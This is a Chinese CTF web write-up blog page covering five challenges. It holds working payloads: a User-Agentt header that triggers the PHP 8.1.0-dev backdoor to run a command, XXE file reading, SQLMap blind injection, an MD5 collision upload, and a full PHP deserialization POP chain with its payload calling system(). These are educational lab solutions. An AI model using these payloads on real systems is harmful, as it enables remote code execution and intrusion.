@@ -1,0 +1,309 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[青少年CTF]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[青少年CTF]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+水
+
+老毕登CTF
+PHP的后门
+页面提示了PHP版本
+X-Powered-By: PHP/8.1.0-dev
+
+搜搜
+
+请求头加上
+User-Agentt:zerodiumsystem(&quot;cat /flag&quot;);
+
+..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [青少年CTF]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-02
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/qing-shao-nian-ctfweb-wp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>水</p>
+</blockquote>
+<p>老毕登CTF</p>
+<h1 id="php的后门"><strong>PHP的后门</strong></h1>
+<p>页面提示了PHP版本</p>
+<pre><code class="language-java">X-Powered-By: PHP/8.1.0-dev
+</code></pre>
+<p>搜搜<br>
+<img src="https://skyblu3519.github.io/post-images/1709309806631.png" alt="" loading="lazy"></p>
+<p>请求头加上</p>
+<pre><code class="language-java">User-Agentt:zerodiumsystem(&quot;cat /flag&quot;);
+</code></pre>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/1709309814971.png" alt="" loading="lazy"></p>
+<h1 id="easymd5">EasyMD5</h1>
+<p>进去是一个PDF文件上传点，简单测试下发现提示MD5碰撞<br>
+<img src="https://skyblu3519.github.io/post-images/1709309821637.png" alt="" loading="lazy"></p>
+<p>使用工具fastcoll生产两个内容不同但MD5相同的pdf文件<br>
+<img src="https://skyblu3519.github.io/post-images/1709309842389.png" alt="" loading="lazy"></p>
+<p>PS.工具下载链接：<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p>
+<p>上传getflag<br>
+<img src="https://skyblu3519.github.io/post-images/1709309848469.png" alt="" loading="lazy"></p>
+<h1 id="php的xxe">PHP的XXE</h1>
+<p>目录扫描到<code>/dom.php</code>，是一个解析xml文档的应用。用外部实体读flag文件即可<br>
+<img src="https://skyblu3519.github.io/post-images/1709309869702.png" alt="" loading="lazy"></p>
+<h1 id="easy_sqli"><strong>Easy_SQLi</strong></h1>
+<p>布尔盲注，没有过滤。直接上SQLMap就行<br>
+<img src="https://skyblu3519.github.io/post-images/1709309875990.png" alt="" loading="lazy"></p>
+<h1 id="雏形系统">雏形系统</h1>
+<p>扫到/www.zip，拿到/index.php的源码。做了代码混淆，直接echo eval的参数即可。最后看到代码执行的逻辑</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+
+class shi
+{
+    public $next;
+    public $pass;
+    public function __toString(){
+        $this-&gt;next::PLZ($this-&gt;pass);
+    }
+}
+class wo
+{
+    public $sex;
+    public $age;
+    public $intention;
+    public function __destruct(){
+        echo &quot;Hi Try serialize Me!&quot;;
+        $this-&gt;inspect();
+    }
+    function inspect(){
+        if($this-&gt;sex=='boy'&amp;&amp;$this-&gt;age=='eighteen')
+        {
+            echo $this-&gt;intention;
+        }
+        echo &quot;🙅18岁🈲&quot;;
+    }
+}
+
+class Demo
+{
+    public $a;
+    static function __callStatic($action, $do)
+    {
+        global $b;
+        $b($do[0]);
+    }
+}
+
+$b = $_POST['password'];
+$a = $_POST['username'];
+@unserialize($a);
+if (!isset($b)) {
+    echo &quot;==================PLZ Input Your Name!==================&quot;;
+}
+if($a=='admin'&amp;&amp;$b==&quot;'k1fuhu's test demo&quot;)
+{
+    echo(&quot;登录成功&quot;);
+}
+
+?&gt;
+</code></pre>
+<p>构造链的入口从<code>wo#__destruct</code>进入，<code>inspect()</code>中的echo到<code>shi#__toString</code>，最后到<code>Demo</code>通过可变函数执行命令，其中<code>$_POST['password']</code>是函数名称<code>shi.pass</code>为传入参数。pop链构造</p>
+<pre><code class="language-php">&lt;?php
+class shi
+{
+
+    public function __construct() {
+        $this-&gt;next = new Demo;
+        $this-&gt;pass = &quot;cat /flag&quot;;
+    }
+}
+class wo
+{
+    public $sex='boy';
+    public $age='eighteen';
+    public function __construct() {
+        $this-&gt;intention = new shi;
+    }
+}
+
+class Demo
+{
+}
+
+$o = serialize(new wo);
+echo $o;
+?&gt;
+</code></pre>
+<p>payload为</p>
+<pre><code>password=system&amp;username=O:2:&quot;wo&quot;:3:{s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:8:&quot;eighteen&quot;;s:9:&quot;intention&quot;;O:3:&quot;shi&quot;:2:{s:4:&quot;next&quot;;O:4:&quot;Demo&quot;:0:{}s:4:&quot;pass&quot;;s:9:&quot;cat /flag&quot;;}}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#php%E7%9A%84%E5%90%8E%E9%97%A8"><strong>PHP的后门</strong></a></li>
+<li><a href="#easymd5">EasyMD5</a></li>
+<li><a href="#php%E7%9A%84xxe">PHP的XXE</a></li>
+<li><a href="#easy_sqli"><strong>Easy_SQLi</strong></a></li>
+<li><a href="#%E9%9B%8F%E5%BD%A2%E7%B3%BB%E7%BB%9F">雏形系统</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/dasctf_x_cbctf2023bypassjava/">
+              <h3 class="post-title">
+                [DASCTF_X_CBCTF2023]bypassJava
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
